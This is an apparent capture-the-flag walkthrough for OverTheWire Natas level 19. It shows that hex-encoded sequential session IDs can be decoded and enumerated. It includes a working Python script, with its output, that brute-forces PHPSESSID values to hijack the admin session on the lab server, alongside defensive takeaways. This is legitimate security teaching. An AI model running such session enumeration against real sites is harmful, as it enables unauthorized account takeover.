# OverTheWire: Natas — Level 19 → Level 20

> **Vulnerability:** Session Enumeration / Predictable Session ID Format                                              
> **Skills:** Cookie analysis, hex decoding, Python scripting                                            
> **Difficulty:** Medium                                             
> **Official Page:** [Natas Level 19](https://overthewire.org/wargames/natas/natas19.html)

---

## Access

- **URL:** `http://natas19.natas.labs.overthewire.org`
- **Username:** `natas19`
- **Password:** *obtain from previous level*

---

## Task

Find the password for natas20 by enumerating session IDs, as in Level 18 — but first determine the session ID encoding scheme the application uses.

---

## Vulnerability

This level demonstrates the same core flaw as Level 18 — **predictable session ID generation** — with one layer of obfuscation added. Session IDs are no longer plain integers; they are hex-encoded strings composed of a sequential integer and the submitted username, joined by a hyphen (e.g., `138-admin` → `3133382d61646d696e`). The developer has applied encoding without introducing any real randomness or entropy. Encoding is not encryption and it is not secrecy: hex is trivially reversible, and the underlying integer sequence is still enumerable. This level exists to illustrate that cosmetic transformations of a weak scheme do not fix the underlying vulnerability.

---

## Theory

### Why encoding is not security

Hex encoding converts each byte of a string into its two-character hexadecimal representation. It is a lossless, fully reversible transformation with no key and no secret. Any value encoded in hex can be decoded by anyone who recognises the encoding. Applying hex to a predictable value produces a predictable hex string — the attack surface is unchanged.

The lesson here mirrors a common real-world mistake: developers sometimes Base64-encode tokens or values and assume they are now opaque or secure. They are not. The only property that makes a session ID secure is **unpredictability** — it must come from a cryptographically secure random source with sufficient entropy.

### Hex encoding and decoding

| Operation | Python | Example |
|---|---|---|
| Encode string to hex | `s.encode("utf-8")` then `.hex()` or `binascii.hexlify(s.encode()).decode()` | `"1-admin"` → `"312d61646d696e"` |
| Decode hex to string | `bytes.fromhex(hex_str).decode("utf-8")` | `"312d61646d696e"` → `"1-admin"` |
| Inspect a cookie in DevTools | Application tab → Cookies | `PHPSESSID: 312d61646d696e` |

### The discovery process: reading a live cookie

When the source code is not available, the correct starting point is observation — not guessing. The application sets a `PHPSESSID` cookie when you log in. That cookie value can be read in the browser, decoded from hex, and inspected to reveal the format. This is what makes the approach reproducible: you derive the token structure from evidence, then generalise it into an enumeration strategy.

### Tools used in this level

| Tool | Purpose |
|---|---|
| Browser DevTools — Application tab | Read the raw `PHPSESSID` cookie value after login |
| `bytes.fromhex()` | Decode a hex string back to its plaintext form in Python |
| `binascii.hexlify()` | Encode a plaintext string to hex in Python |
| Python `requests` library | Send HTTP requests with custom cookies and HTTP Basic Auth |

---

## Solution

### Step 1: Log in and read the hint on the page

Navigate to `http://natas19.natas.labs.overthewire.org` and authenticate with username `natas19` and the password from Level 18. You will see the same login form as Level 18. The page includes a note:

```
NOTE: This page uses a slightly different encoding than last time
```

> **What to notice:** The application is telling you the session ID format has changed, but it is not telling you what the new format is. The next step is to log in with a test account and examine the cookie the server sets.

### Step 2: Submit a login and inspect the PHPSESSID cookie

Submit any credentials through the form — for example, username `test` and password `test`. The form accepts any input; what matters is that the server responds and sets a `PHPSESSID` cookie.

Open DevTools (`F12`), navigate to the **Application** tab, expand **Cookies**, and select the natas19 origin. Find the `PHPSESSID` entry and copy its value.

You will see something like:

```
PHPSESSID: 3131342d74657374
```

> **What to notice:** This does not look like a plain integer, but it does look like hex — it contains only characters `0–9` and `a–f`, and its length is a multiple of two. Decode it to confirm.

### Step 3: Decode the cookie to discover the format

Open a Python shell and decode the value:

```python
bytes.fromhex("3131342d74657374").decode("utf-8")
```

```
'114-test'
```

> **What to notice:** The plaintext form is `{integer}-{username}`. The integer is the same kind of sequential session ID used in Level 18, capped at 640. The username is whatever was submitted in the login form. This tells you exactly what to generate: for an admin session, the plaintext is `{i}-admin` for each integer `i` in the range 1 to 640, hex-encoded.

### Step 4: Write and run the enumeration script

The script constructs the token `{i}-admin` for each integer from 1 to 640, hex-encodes it, and sends a GET request with that value as `PHPSESSID`. When the response contains `"You are an admin"`, the correct session has been found.

Save the following as `natas19_enum.py`:

```python
#!/usr/bin/env python3

import binascii
import time
import requests
from requests.auth import HTTPBasicAuth

USERNAME = "natas19"
PASSWORD = "<natas19_password>"   # Replace with the actual password from Level 18
URL      = f"http://{USERNAME}.natas.labs.overthewire.org/"
AUTH     = HTTPBasicAuth(USERNAME, PASSWORD)
MAX_ID   = 640

session = requests.Session()

for i in range(1, MAX_ID + 1):
    plaintext  = f"{i}-admin"
    hex_token  = binascii.hexlify(plaintext.encode("utf-8")).decode("ascii")
    cookies    = {"PHPSESSID": hex_token}

    try:
        resp = session.get(URL, cookies=cookies, auth=AUTH, timeout=8)
    except requests.RequestException as e:
        print(f"[!] Request error at i={i}: {e}")
        time.sleep(1)
        continue

    if "You are an admin" in resp.text:
        print(f"[+] Admin session found! i={i}, PHPSESSID={hex_token}")
        print(f"[+] Decoded: {plaintext}")
        print()
        print(resp.text)
        break
    else:
        print(f"[-] Trying i={i} → {hex_token}")
```

Run it:

```bash
python3 natas19_enum.py
```

```
[-] Trying i=1 → 312d61646d696e
[-] Trying i=2 → 322d61646d696e
[-] Trying i=3 → 332d61646d696e
...
[-] Trying i=280 → 3238302d61646d696e
[+] Admin session found! i=281, PHPSESSID=3238312d61646d696e
[+] Decoded: 281-admin

<html>
...
You are an admin. The credentials for the next level are:
Username: natas20
Password: <censored>
...
</html>
```

> **What to notice:** The admin session ID decoded to `281-admin` — confirming the format discovered in Step 3. The enumeration found it after 281 requests, which at the scale of 640 total candidates takes only a few seconds. The hex encoding added zero effective resistance to the attack.

### Step 5: Extract the password

The password for natas20 is printed directly in the response body inside a `<pre>` block. Copy it and store it for the next level.

---

## Password for Next Level

```
[redacted — obtain by completing the steps above]
```

---

## Key Takeaways

Encoding a predictable value does not make it unpredictable. Hex, Base64, and similar transforms are reversible by design and provide no security property — they are data formats, not protection mechanisms. The only defence against session enumeration is generating session IDs from a cryptographically secure source (such as PHP's default `session_start()`, which uses a CSPRNG) with enough entropy that exhaustive search is infeasible. This level also illustrates the value of reading live cookies before scripting: decoding the observed `PHPSESSID` value is what reveals the token structure and makes the attack precise rather than speculative.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Guessing the token format without decoding a real cookie first | Script constructs the wrong plaintext (e.g., just the integer, or the wrong separator) and never finds the admin session | Always log in with a test account, read the raw cookie, and decode it before writing the enumeration script |
| Forgetting to include the username component (`-admin`) in the token | The hex values never match an admin session; all 640 requests return regular-user content | The plaintext format is `{i}-admin` — both components are required |
| Hex-encoding the already-hex string a second time | The `PHPSESSID` value is double-encoded and the server rejects or ignores it | Encode only the plaintext string once: `binascii.hexlify(plaintext.encode("utf-8"))` |
| Using `range(1, 640)` instead of `range(1, 641)` | ID 640 is never tested | Use `range(1, MAX_ID + 1)` to include the upper bound |
| Forgetting HTTP Basic Auth in the script | All requests return 401 Unauthorized | Pass `auth=HTTPBasicAuth(username, password)` on every request |
